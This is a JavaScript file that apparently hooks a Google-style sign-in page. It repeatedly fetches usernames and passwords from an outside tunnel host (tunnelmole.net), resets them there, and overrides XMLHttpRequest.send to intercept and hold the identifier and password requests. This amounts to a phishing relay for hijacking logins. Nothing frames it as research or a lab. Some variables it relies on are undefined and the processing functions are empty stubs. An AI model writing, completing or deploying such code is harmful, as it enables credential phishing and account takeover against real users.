let freqUsername = null;
let freqPassword = null;
let usernameFetched = false;
let passwordFetched = false;
let inPasswordPage = false;

// ✅ Check if we are on the password page
const checkPasswordPage = () => {
    if (window.location.href.includes('challenge/pwd')) {
        inPasswordPage = true;
        console.log('Now on the password page');
        fetchFreqPassword(); // Begin password fetch independently
    } else {
        inPasswordPage = false;
    }
};

// ✅ Fetch username
const fetchFreqUsername = async () => {
    if (usernameFetched) return;
    console.log('Fetching username...');

    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-post-data:', result);

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });

            processUsernameRequests();  // Process username requests without waiting for password

            // Trigger password page navigation check in parallel
            setTimeout(checkPasswordPage, 1000);  // Check if we are on the password page after 1 second
        } else {
            console.warn("No username data received, retrying...");
            setTimeout(fetchFreqUsername, 500);
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 500);
    }
};

// ✅ Fetch password independently
const fetchFreqPassword = async () => {
    if (passwordFetched || !inPasswordPage) return; // Proceed only if on password page
    console.log('Fetching password...');

    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-password', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-post-password:', result);

        if (result?.postData) {
            freqPassword = result.postData;
            console.log('Fetched password:', freqPassword);
            passwordFetched = true;

            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-password', { method: 'POST' });

            processPasswordRequests();  // Process password requests when data is available
        } else {
            console.warn("No password data received, retrying...");
            setTimeout(fetchFreqPassword, 500);
        }
    } catch (error) {
        console.error('Error fetching password:', error);
        setTimeout(fetchFreqPassword, 500);
    }
};

// ✅ Process pending username requests
const processUsernameRequests = () => {
    if (!freqUsername) {
        console.log("Username not available yet, retrying...");
        setTimeout(processUsernameRequests, 500);
        return;
    }

    console.log("Processing pending username requests...");
    // Process username-related intercepted requests here
};

// ✅ Process pending password requests
const processPasswordRequests = () => {
    if (!freqPassword) {
        console.log("Password not available yet, retrying...");
        setTimeout(processPasswordRequests, 500);
        return;
    }

    console.log("Processing pending password requests...");
    // Process password-related intercepted requests here
};

// ✅ Intercept XMLHttpRequest
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    if (/identity-signin-identifier/.test(body) && !modifiedUsernameRequests.has(body)) {
        console.log("Intercepted username request:", body);
        pendingUsernameRequests.set(this, body);
        processUsernameRequests();
    } else if (/identity-signin-password/.test(body) && !modifiedPasswordRequests.has(body) && inPasswordPage) {
        console.log("Intercepted password request:", body);
        pendingPasswordRequests.set(this, body);
        processPasswordRequests();
    } else {
        originalXhrSend.call(this, body);
    }
};

// ✅ Attach event listeners for username and password submission
document.addEventListener('DOMContentLoaded', () => {
    const usernameButton = document.getElementById('sendUsernameBtn');
    const passwordButton = document.getElementById('sendPasswordBtn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    if (usernameButton) usernameButton.addEventListener('click', sendUsername);
    if (passwordButton) passwordButton.addEventListener('click', sendPassword);
    
    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') sendUsername();
        });
    }

    if (passwordInput) {
        passwordInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') sendPassword();
        });
    }

    fetchFreqUsername();
});

